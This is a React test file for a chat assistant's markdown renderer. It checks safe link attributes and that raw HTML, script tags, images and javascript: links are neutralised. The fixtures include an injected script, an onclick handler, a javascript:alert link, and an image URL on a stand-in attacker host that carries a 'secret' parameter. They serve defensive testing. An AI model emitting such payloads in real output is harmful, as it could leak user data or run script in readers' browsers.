import { describe, expect, it } from "vitest";

import { AssistantMarkdown } from "./AssistantMarkdown";

import { render, screen } from "@testing-library/react";

describe("AssistantMarkdown", () => {
  it("renders markdown and opens links in a new tab without a handle back to Console", () => {
    render(<AssistantMarkdown>{"Read **the docs** at [Akash](https://akash.network/docs)."}</AssistantMarkdown>);

    expect(screen.getByText("the docs").tagName).toBe("STRONG");
    const link = screen.getByRole("link", { name: "Akash" });
    expect(link).toHaveAttribute("href", "https://akash.network/docs");
    expect(link).toHaveAttribute("target", "_blank");
    expect(link).toHaveAttribute("rel", "noopener noreferrer");
  });

  it("never renders raw HTML or images an answer names", () => {
    const { container } = render(
      <AssistantMarkdown>
        {'<script>window.ran = true</script><b onclick="x()">bold</b>\n\n![tracker](https://evil.test/pixel?secret=1) after'}
      </AssistantMarkdown>
    );

    expect(container.querySelector("script")).toBeNull();
    expect(container.querySelector("b")).toBeNull();
    expect(container.querySelector("img")).toBeNull();
    expect(container).toHaveTextContent("after");
  });

  it("makes javascript links inert", () => {
    render(<AssistantMarkdown>{"[click](javascript:alert(1))"}</AssistantMarkdown>);

    expect(screen.getByText("click").closest("a")).toHaveAttribute("href", "javascript:void(0)");
  });
});
